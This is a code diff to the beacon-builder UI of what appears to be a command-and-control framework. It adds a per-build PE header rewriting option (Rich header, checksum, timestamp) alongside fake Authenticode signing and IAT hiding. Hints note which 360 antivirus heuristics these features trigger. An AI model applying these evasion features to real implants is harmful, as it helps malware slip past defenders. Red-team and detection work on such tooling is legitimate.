@@ -429,6 +429,9 @@ function GenerateUI(listeners_type)
     checkExePseudoSign.setChecked(true);
     checkExePseudoSign.setVisible(false);
 
+    let checkPeHeaderMod = form.create_check("PE header mod (Rich header + timestamp + checksum)");
+    checkPeHeaderMod.setChecked(true);
+
     //////////////////// DNS Settings
 
     let labelDnsMode = form.create_label("DNS Mode:");
@@ -571,10 +574,11 @@ function GenerateUI(listeners_type)
     layout.addWidget(checkIconRandom,     9, 1, 1, 1);
     layout.addWidget(iconSelector,        9, 2, 1, 1);
     layout.addWidget(checkExePseudoSign,  10, 0, 1, 3);
-    layout.addWidget(checkIatHiding,      11, 0, 1, 3);
-    layout.addWidget(group_proxy,        12, 0, 1, 3);
-    layout.addWidget(group_dns,          13, 0, 1, 3);
-    layout.addWidget(spacer2,            14, 0, 1, 3);
+    layout.addWidget(checkPeHeaderMod,    11, 0, 1, 3);
+    layout.addWidget(checkIatHiding,      12, 0, 1, 3);
+    layout.addWidget(group_proxy,        13, 0, 1, 3);
+    layout.addWidget(group_dns,          14, 0, 1, 3);
+    layout.addWidget(spacer2,            15, 0, 1, 3);
 
     function updateIconFileVisibility() {
         let pe = (comboAgentFormat.currentText() == "Exe" || comboAgentFormat.currentText() == "Service Exe" || comboAgentFormat.currentText() == "DLL");
@@ -610,6 +614,7 @@ function GenerateUI(listeners_type)
         }
         updateIconRowVisibility(text);
         updateExePseudoSignVisibility(text);
+        updatePeHeaderModVisibility(text);
     });
     form.connect(checkIconRandom, "stateChanged", function() {
         updateIconFileVisibility();
@@ -617,8 +622,12 @@ function GenerateUI(listeners_type)
     function updateExePseudoSignVisibility(fmt) {
         checkExePseudoSign.setVisible(fmt == "Exe" || fmt == "Service Exe");
     }
+    function updatePeHeaderModVisibility(fmt) {
+        checkPeHeaderMod.setVisible(fmt == "Exe" || fmt == "Service Exe" || fmt == "DLL");
+    }
     updateIconRowVisibility(comboAgentFormat.currentText());
     updateExePseudoSignVisibility(comboAgentFormat.currentText());
+    updatePeHeaderModVisibility(comboAgentFormat.currentText());
 
     let container = form.create_container()
     container.put("arch",                comboArch)
@@ -641,6 +650,7 @@ function GenerateUI(listeners_type)
     container.put("icon_random",         checkIconRandom)
     container.put("icon_content",        iconSelector)
     container.put("exe_pseudo_sign",     checkExePseudoSign)
+    container.put("pe_header_mod",       checkPeHeaderMod)
     container.put("iat_hiding",          checkIatHiding)
     container.put("use_proxy",           group_proxy)
     container.put("proxy_type",          comboProxyType)
@@ -656,7 +666,7 @@ function GenerateUI(listeners_type)
     return {
         ui_panel: panel,
         ui_container: container,
-        ui_height: 540,
+        ui_height: 570,
         ui_width: 500
     }
 }
@@ -716,6 +726,7 @@ function BuildSchema(listener_type)
             { key: "svcname", label: "服务名", type: "text", group: "进程与签名", show_if: { format_in: ["Service Exe"] }, hint: "Service Exe 必填：pl_main.go:975 只是逐字符转义后串进 -DSERVICE_NAME，空值不报错，会生成一个装不上的服务" },
             { key: "iat_hiding", label: "IAT Hiding（无 CRT、空导入表）", type: "bool", group: "进程与签名", hint: "插件默认值来自 buildenv.mk 的 BEACON_IAT_HIDING_DEFAULT（见 pl_main.go:400）；开启后被 360 QVM 2.0 判为 HEUR/QVM.9B7A" },
             { key: "exe_pseudo_sign", label: "Exe 伪 Authenticode 签名", type: "bool", group: "进程与签名", show_if: { format_in: ["Exe", "Service Exe"] }, hint: "随机自签名；服务端缺 openssl/osslsigncode 时跳过并记构建日志，不失败" },
+            { key: "pe_header_mod", label: "PE Header 改写（Rich header）", type: "bool", group: "进程与签名", show_if: { format_in: F_EXE }, hint: "默认跟随 buildenv.mk 的 BEACON_PE_HEADER_MOD=true；用 pe_header_mod.py 覆写 Rich header + 校验和 + 时间戳做 per-build 多样化。取消勾选即完全不跑这一步" },
             // -- 信标窗口 ----------------------------------------------------
             { key: "is_killdate", label: "启用 killdate", type: "bool", group: "信标窗口" },
             { key: "kill_date", label: "killdate 日期", type: "text", group: "信标窗口", hint: "GMT 时间" },
